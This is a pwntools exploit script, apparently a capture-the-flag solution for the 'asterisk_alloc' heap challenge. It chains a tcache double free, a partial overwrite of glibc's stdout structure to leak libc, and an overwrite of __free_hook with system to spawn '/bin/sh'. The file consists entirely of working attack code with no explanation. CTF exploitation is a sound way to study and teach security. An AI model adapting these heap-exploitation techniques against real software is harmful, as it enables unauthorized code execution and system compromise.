from pwn import *

TARGET = './asterisk_alloc'
HOST = 'ast-alloc.chal.ctf.westerns.tokyo'
PORT = 10001

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
# r = remote(HOST, PORT)

elf = ELF(TARGET)


def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def malloc(size, data):
    r.sendline('1')
    r.sendlineafter('Size: ', str(size))
    r.sendlineafter('Data: ', data)
    r.recvuntil('choice: ')

def calloc(size, data):
    r.sendline('2')
    r.sendlineafter('Size: ', str(size))
    r.sendlineafter('Data: ', data)
    r.recvuntil('choice: ')

def realloc(size, data):
    r.sendline('3')
    r.sendlineafter('Size: ', str(size))
    if size <= 0:
        return r.recvuntil('choice: ')
    r.sendafter('Data: ', data)
    return r.recvuntil('choice: ')

def free(x):
    r.sendline('4')
    r.sendlineafter('Which: ', x)
    r.recvuntil('choice: ') 

while(1): 
    r = process(TARGET)
    # r = remote(HOST, PORT)
    r.recvuntil('choice: ')
    realloc(0x90, 'AAAA')
    calloc(0x90, 'MMMM') # prepare for escaping from stdout
    for i in range(8):
        free('r')

    realloc(0x90, '\x60\xa7') # point stdout with 1/16
    # pause()
    # realloc(0, 'A')
    
    # malloc(0x90, 'CCCC')
    # pause()
    realloc(-1, 'A')
    realloc(0x90, 'A')
    realloc(-1, 'A')

    payload = p64(0xfbad1800)
    payload += p64(0) * 3
    payload += '\x00'

    try: 
        leak = u64(realloc(0x90, payload)[8:16])
        assert leak != 0x3d3d3d3d3d3d3d3d
        break
    except:
        r.close()

context.log_level = 'debug'
gdb.attach(r, '''
c
''')

base = leak - (0x7fcf2aa738b0 - 0x00007fcf2a686000)
dbg("leak")
dbg("base") 
free_hook = base + 0x3ed8e8
system = base + 0x4f440

free('c') # here to help
realloc(-1, 'A')
realloc(0x90, 'A')
free('r')
free('r')

realloc(-1, 'A')
realloc(0x90, p64(free_hook))
realloc(-1, 'A')
realloc(0x90, p64(0xc0bebeef))
realloc(-1, 'A')
realloc(0x90, p64(system))

malloc(0x10, '/bin/sh\x00') 
r.sendline('4')
r.sendlineafter('Which: ', 'm')

r.interactive()
r.close()
